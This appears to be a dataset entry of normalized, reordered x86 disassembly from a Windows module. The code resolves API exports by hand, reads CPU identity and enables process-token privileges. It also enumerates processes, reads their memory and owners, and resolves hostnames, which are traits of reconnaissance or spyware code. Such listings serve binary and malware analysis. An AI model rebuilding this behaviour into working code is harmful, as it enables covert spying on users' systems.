mov eax [ esi + ecx + 0x18 ]
add esi ecx
cmp eax edx
je r-xdata
cmp [ esi + 0x14 ] edi
je r-xdata
xor eax eax
mov esi [ eax + 0x78 ]
mov eax [ esi + ecx + 0x18 ]
add esi ecx
test eax eax
je r-xdata
cmp [ esi + 0x14 ] edx
je r-xdata
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi ecx
add ebx ecx
mov [ ebp - 0x4 ] 0x0
test eax eax
jne r-xdata
xor al al
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi ecx
add ebx ecx
mov [ ebp - 0x8 ] edx
test eax eax
je r-xdata
mov edx [ edi ]
add edx ecx
push edx
push r--data
call sub_10014e74
add esp 0x8
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
mov [ ebx + 0xaa8 ] eax
lea esi [ ebx + 0xab4 ]
mov ecx 0x8
mov edi rw-data
push rw-data
[ edi ] [ esi ]
call edx
add esp 0x8
test al al
je r-xdata
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi ecx
add ebx ecx
mov [ ebp - 0x8 ] 0x0
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
add edi 0x4
add ebx 0x2
mov [ ebp - 0x4 ] eax
cmp eax [ esi + 0x18 ]
jb r-xdata
call sub_100021e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0xab0 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
mov [ ebp - 0xc ] ecx
je r-xdata
mov edx [ edi ]
add edx ecx
push edx
push r--data
call sub_10014e74
add esp 0x8
test eax eax
je r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ edi ]
add eax ecx
push eax
push r--data
call sub_10014e74
add esp 0x8
test eax eax
je r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
add edi 0x4
add ebx 0x2
mov [ ebp - 0x8 ] eax
cmp eax [ esi + 0x18 ]
jb r-xdata
mov ecx [ esi + 0x1c ]
lea edx [ ecx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ edx + ecx ]
add eax ecx
je r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
add edi 0x4
add ebx 0x2
mov [ ebp - 0x8 ] eax
cmp eax [ esi + 0x18 ]
jb r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax [ esi + 0x14 ]
jbe r-xdata
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xaac ] eax
mov ebx ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax [ esi + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0xc ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
lea edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + eax ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ esi + 0x1c ]
lea edx [ ecx + eax * 4 ]
mov ecx [ ebp - 0xc ]
mov eax [ edx + ecx ]
add eax ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
sub_10002600
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi eax
xor bl bl
test esi esi
je r-xdata
push esi
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push r--data
push esi
call sub_1000928a
add esp 0x1c
cmp eax 0x4
je r-xdata
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov ecx [ eax ]
push ecx
call [ inet_ntoa@IAT ]
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov eax 0xff
cmp [ ebp - 0x8 ] eax
ja r-xdata
cmp eax 0x5
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
push edi
call sub_10010170
add esp 0xc
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] eax
ja r-xdata
cmp [ ebp - 0x1 ] 0x2f
jne r-xdata
cmp [ ebp - 0x10 ] eax
ja r-xdata
cmp [ ebp - 0x14 ] eax
ja r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
push edi
call sub_10010170
add esp 0xc
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_100026d0
movzx eax [ edi ]
push esi
push eax
mov esi edi
call sub_100097ee
add esp 0x4
test eax eax
je r-xdata
mov ecx edi
mov eax esi
jmp r-xdata
movzx ecx [ esi + 0x2 ]
add esi 0x2
push ecx
call sub_100097ee
add esp 0x4
test eax eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
pop esi
retn
mov eax edi
lea edx [ eax + 0x2 ]
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
mov edx esi
sub edx edi
sar eax 0x1
sar edx 0x1
sub eax edx
movzx eax ax
lea ecx [ eax + eax + 0x2 ]
push ecx
push esi
push edi
call sub_100092b0
add esp 0xc
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
sub_10002760
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x2c
lea ecx [ ebp - 0x30 ]
push 0x0
push ecx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
call sub_1000ffa0
xor ecx ecx
mov eax 0x80000002
cpuid
lea esi [ ebp - 0x34 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
xor ecx ecx
mov eax 0x80000003
cpuid
lea esi [ ebp - 0x24 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
add esp 0xc
xor ecx ecx
mov eax 0x80000004
cpuid
lea esi [ ebp - 0x14 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov esi [ ebp - 0x38 ]
lea ecx [ esi + 0x4 ]
lea eax [ ebp - 0x32 ]
mov edx 0xc
movzx edi [ eax - 0x2 ]
mov [ ecx - 0x4 ] di
movzx edi [ eax - 0x1 ]
mov [ ecx - 0x2 ] di
movzx edi [ eax ]
mov [ ecx ] di
movzx edi [ eax + 0x1 ]
mov [ ecx + 0x2 ] di
add eax 0x4
add ecx 0x8
dec edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ esi + 0x60 ] dx
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
sub_10002820
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
test esi esi
jne r-xdata
push edi
mov ecx esi
mov edi r--data
mov [ ebp - 0x4 ] 0x0
call sub_10002c10
cmp al 0x1
jne r-xdata
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov ecx [ eax ]
mov eax ecx
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
mov ebx eax
mov eax ecx
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
push rw-data
call sub_10010170
add esp 0xc
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov edi rw-data
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov cx [ r--data ]
mov [ edi ] cx
mov ecx [ eax ]
mov eax ecx
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
lea edx [ ebx + rw-data ]
push edx
call sub_10010170
add esp 0xc
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov [ rw-data ] 0xfa0
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov [ rw-data ] 0x4
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov eax [ eax ]
push eax
call sub_10008ee4
add esp 0x4
imul eax eax 0x3e8
mov [ rw-data ] eax
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov ecx [ eax ]
push ecx
call sub_10008ee4
add esp 0x4
imul eax eax 0x3e8
mov [ rw-data ] eax
jmp r-xdata
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov edx [ eax ]
mov eax edx
lea edi [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov edi rw-data
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
mov ebx eax
push ebx
push edx
push rw-data
call sub_10010170
add esp 0xc
jmp r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10002c60
test eax eax
je r-xdata
mov edx [ eax ]
mov eax edx
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov dx [ r--data ]
mov [ edi ] dx
mov ecx [ eax ]
mov eax ecx
lea edi [ eax + 0x1 ]
lea ecx [ ecx ]
mov ecx esi
mov edi r--data
call sub_10002c10
cmp al 0x1
jne r-xdata
mov edx [ eax ]
mov eax edx
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
push rw-data
call sub_10010170
add esp 0xc
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
lea eax [ ebx + rw-data ]
push eax
call sub_10010170
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
push rw-data
call sub_10010170
add esp 0xc
sub_10002aa0
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0xff
xor ebx ebx
lea eax [ ebp - 0x103 ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x104 ] 0x0
call sub_1000ffa0
mov eax esi
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x104 ]
push esi
push ecx
call sub_10010170
lea eax [ ebp - 0x104 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov edi eax
push 0x8
mov [ ebp - 0x118 ] edi
call sub_1000919c
mov esi eax
push 0x4
mov [ ebp - 0x10c ] esi
mov [ esi + 0x4 ] ebx
call sub_10008c7c
mov [ esi ] eax
mov [ eax ] ebx
add esp 0x8
mov eax esi
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x108 ] ebx
cmp edi ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
lea ebx [ ebx ]
push 0x8
call sub_1000919c
mov edi ebx
sub edi [ ebp - 0x108 ]
mov esi eax
lea eax [ edi + 0x1 ]
push eax
mov [ ebp - 0x110 ] eax
call sub_10008c7c
mov edx [ ebp - 0x110 ]
push edx
push 0x0
push eax
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
call sub_1000ffa0
mov eax [ ebp - 0x108 ]
mov edx [ esi ]
push edi
lea ecx [ ebp + eax - 0x104 ]
push ecx
push edx
call sub_10010170
mov eax [ ebp - 0x10c ]
add esp 0x20
cmp [ ebp + ebx - 0x104 ] 0x20
mov [ eax + 0x4 ] esi
mov [ ebp - 0x10c ] esi
jne r-xdata
test al al
jne r-xdata
mov edi [ ebp - 0x118 ]
mov [ ebp - 0x108 ] ebx
mov edi edi
inc ebx
cmp ebx edi
jle r-xdata
mov al [ ebp + ebx - 0x104 ]
cmp al 0x20
je r-xdata
mov eax [ ebp - 0x114 ]
inc ebx
cmp [ ebp + ebx - 0x104 ] 0x20
je r-xdata
sub_10002c10
xor al al
push esi
mov esi ecx
test ecx ecx
je r-xdata
pop esi
retn
push ebx
lea ebx [ ebx ]
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
mov al 0x1
pop ebx
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov ecx [ esi ]
mov edx edi
pop ebx
pop esi
retn
test ecx ecx
je r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sub_10002c60
push esi
mov esi [ eax + 0x4 ]
xor eax eax
test esi esi
je r-xdata
pop esi
retn
push ebx
jmp r-xdata
mov ecx [ esi ]
mov edx edi
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
pop ebx
mov eax ecx
pop ebx
pop esi
retn
test ecx ecx
je r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sub_10002cd0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10009900
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10009140
add esp 0x4
sub_10002d10
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x28
mov [ ebp - 0x18 ] 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov al 0x1
call sub_10008d64
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
xor eax eax
push ecx
push r--data
mov [ ebp - 0x8 ] eax
push eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x18 ]
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push 0x0
push eax
call [ AdjustTokenPrivileges@IAT ]
sub_10002da0
push ebp
mov ebp esp
sub esp 0x29c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx edx
push esi
mov [ ebp - 0x234 ] eax
xor eax eax
push edi
mov esi ecx
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x228 ] eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
push 0x400
push eax
push ebx
call sub_1000ffa0
add esp 0xc
push esi
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov edi eax
mov [ ebp - 0x224 ] edi
test edi edi
je r-xdata
mov esi [ ebp - 0x21c ]
mov esi [ LoadLibraryA@IAT ]
push r--data
call esi
mov ecx eax
mov [ ebp - 0x230 ] ecx
test ecx ecx
je r-xdata
push r--data
mov [ ebp - 0x22c ] 0x400
call esi
mov esi eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x22c ]
push ecx
push ebx
push 0x0
push edi
call eax
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x400
push ebx
push 0x0
push edi
call eax
test eax eax
je r-xdata
push r--data
push ecx
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x21c ] 0x1
mov [ ebp - 0x21c ] 0x1
jmp r-xdata
cmp [ ebp - 0x21c ] 0x0
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
xor esi esi
cmp ecx esi
je r-xdata
mov eax [ ebp - 0x228 ]
test eax eax
je r-xdata
push eax
call [ FreeLibrary@IAT ]
xor eax eax
push 0x44
lea edx [ ebp - 0x294 ]
push esi
push edx
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x23c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x298 ] esi
call sub_1000ffa0
push 0x20f
lea eax [ ebp - 0x217 ]
push esi
push eax
mov [ ebp - 0x218 ] 0x0
call sub_1000ffa0
add esp 0x18
push r--data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x228 ] eax
cmp eax esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov esi [ ebp - 0x21c ]
test esi esi
jne r-xdata
push eax
call [ FreeLibrary@IAT ]
push r--data
mov ecx eax
push ecx
call [ GetProcAddress@IAT ]
cmp eax esi
je r-xdata
push 0x400
push ebx
push edi
call eax
test eax eax
je r-xdata
push r--data
push ecx
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
cmp eax esi
je r-xdata
mov eax esi
jmp r-xdata
lea edx [ ebp - 0x22c ]
push edx
push 0x18
lea ecx [ ebp - 0x24c ]
push ecx
push esi
push edi
call eax
test eax eax
jne r-xdata
mov [ ebp - 0x21c ] 0x1
jmp r-xdata
push 0x400
push 0x0
push ebx
call sub_1000ffa0
add esp 0xc
mov eax [ ebp - 0x248 ]
cmp eax esi
je r-xdata
mov ebx [ ReadProcessMemory@IAT ]
push esi
push 0x40
lea edx [ ebp - 0x218 ]
push edx
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ebx [ ebp - 0x220 ]
mov eax [ ebp - 0x208 ]
test eax eax
je r-xdata
push 0x0
push 0x48
lea ecx [ ebp - 0x298 ]
push ecx
push eax
push edi
call ebx
test eax eax
je r-xdata
movzx edi [ ebp - 0x260 ]
push edi
call sub_10009991
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov edi [ ebp - 0x224 ]
mov edx [ ebp - 0x25c ]
mov eax [ ebp - 0x224 ]
push 0x0
push edi
push esi
push edx
push eax
call ebx
test eax eax
je r-xdata
push esi
call sub_10009957
add esp 0x4
movzx ecx [ ebp - 0x260 ]
mov edi [ ebp - 0x220 ]
push 0x0
push 0x0
push 0x400
push edi
shr ecx 0x1
push ecx
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov ebx [ ebp - 0x234 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x21c ] 0x1
push 0x5c
push edi
call sub_10009ae0
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
dec edx
push edx
inc eax
push eax
push ebx
call sub_10008ef0
add esp 0xc
sub_10003100
push ebp
mov ebp esp
sub esp 0x420
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
push 0x1ff
lea eax [ ebp - 0x203 ]
push ebx
push eax
mov esi ecx
mov edi edx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x420 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x204 ] bl
call sub_1000ffa0
push 0x1ff
lea ecx [ ebp - 0x403 ]
push ebx
push ecx
mov [ ebp - 0x404 ] bl
call sub_1000ffa0
add esp 0x18
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10008d64
mov esp ebp
pop ebp
retn
push 0x400
push ebx
push edi
call sub_1000ffa0
add esp 0xc
push esi
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
mov [ ebp - 0x41c ] esi
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x410 ]
mov edi [ CloseHandle@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x410 ]
push edx
push 0x8
push esi
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
cmp esi ebx
je r-xdata
push eax
call edi
mov ecx [ ebp - 0x410 ]
lea eax [ ebp - 0x40c ]
push eax
push ebx
push ebx
push 0x1
push ecx
call [ GetTokenInformation@IAT ]
mov edx [ ebp - 0x40c ]
push edx
call sub_10009991
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x408 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
push esi
call edi
mov esi [ ebp - 0x41c ]
mov ecx [ ebp - 0x40c ]
mov edx [ ebp - 0x410 ]
lea eax [ ebp - 0x40c ]
push eax
push ecx
push esi
push 0x1
push edx
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push esi
call sub_10009957
add esp 0x4
mov eax 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x418 ] eax
lea eax [ ebp - 0x420 ]
push eax
lea ecx [ ebp - 0x418 ]
push ecx
lea edx [ ebp - 0x404 ]
push edx
mov edx [ esi ]
lea eax [ ebp - 0x414 ]
push eax
lea ecx [ ebp - 0x204 ]
push ecx
push edx
push ebx
call [ LookupAccountSidA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
lea ecx [ ebp - 0x404 ]
push ecx
push r--data
push 0x3ff
push edi
call sub_10009a25
add esp 0x14
mov [ ebp - 0x408 ] 0x1
sub_100032e0
push ebp
mov ebp esp
sub esp 0x2c
push ebx
mov ebx [ LoadLibraryA@IAT ]
xor eax eax
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] eax
jne r-xdata
push r--data
mov edi 0x1
call ebx
mov ebx eax
test ebx ebx
je r-xdata
push r--data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
lea edi [ eax + 0x1 ]
call ebx
mov esi eax
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push r--data
push ebx
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov [ rw-data ] edi
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax [ ebp + 0x8 ]
push eax
xor edi edi
push edi
push 0x400
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
lea ecx [ ebp - 0x2c ]
push ecx
call eax
movzx eax [ ebp - 0x2c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
push edx
push esi
call [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
push eax
push 0x1000
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
cmp eax 0x6
je r-xdata
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] edi
mov edi 0x1
jne r-xdata
mov edi 0x3
xor edx edx
cmp eax 0x9
setne dl
lea edi [ edx - 0x1 ]
and edi 0x2
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov edi [ rw-data ]
sub_10003400
push ebp
mov ebp esp
push 0xffffffff
push sub_1001675b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x9b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push 0x124
lea ecx [ ebp - 0x9a0 ]
push ebx
push ecx
mov [ ebp - 0x9b8 ] eax
mov edi 0x6
mov [ ebp - 0x9a4 ] ebx
call sub_1000ffa0
add esp 0xc
push r--data
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ ebp - 0x9b0 ] esi
cmp esi ebx
je r-xdata
mov eax edi
jmp r-xdata
mov edi [ GetProcAddress@IAT ]
push r--data
push esi
call edi
push r--data
push esi
mov [ ebp - 0x9a8 ] eax
call edi
push r--data
push esi
mov [ ebp - 0x9ac ] eax
call edi
mov ecx [ ebp - 0x9a8 ]
mov [ ebp - 0x9b4 ] eax
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov eax 0x6
mov esi [ ebp - 0x9ac ]
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
push ebx
push 0x2
call ecx
mov [ ebp - 0x9a8 ] eax
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0x9a4 ]
push edx
push eax
mov [ ebp - 0x9a4 ] 0x128
call esi
test eax eax
je r-xdata
jmp r-xdata
push 0x3ff
lea eax [ ebp - 0x813 ]
push ebx
push eax
mov [ ebp - 0x814 ] bl
call sub_1000ffa0
add esp 0xc
push 0x3ff
lea ecx [ ebp - 0x413 ]
push ebx
push ecx
mov [ ebp - 0x414 ] bl
call sub_1000ffa0
mov ecx [ ebp - 0x99c ]
add esp 0xc
push ebx
push ebx
lea edx [ ebp - 0x814 ]
call sub_10002da0
mov ecx [ ebp - 0x99c ]
lea edx [ ebp - 0x414 ]
call sub_10003100
mov edx [ ebp - 0x99c ]
push edx
call sub_100032e0
mov [ ebp - 0x9ac ] eax
mov eax 0xf
add esp 0xc
mov [ ebp - 0x860 ] eax
mov [ ebp - 0x864 ] ebx
mov [ ebp - 0x874 ] bl
mov [ ebp - 0x840 ] eax
mov [ ebp - 0x844 ] ebx
mov [ ebp - 0x854 ] bl
mov [ ebp - 0x820 ] eax
mov [ ebp - 0x824 ] ebx
mov [ ebp - 0x834 ] bl
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x99c ]
mov ecx [ ebp - 0x98c ]
mov [ ebp - 0x87c ] eax
lea eax [ ebp - 0x980 ]
mov [ ebp - 0x878 ] ecx
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x980 ]
lea esi [ ebp - 0x874 ]
call sub_10003ed0
lea eax [ ebp - 0x814 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x814 ]
lea esi [ ebp - 0x834 ]
call sub_10003ed0
lea eax [ ebp - 0x414 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x854 ]
call sub_10003ed0
mov edx [ ebp - 0x9ac ]
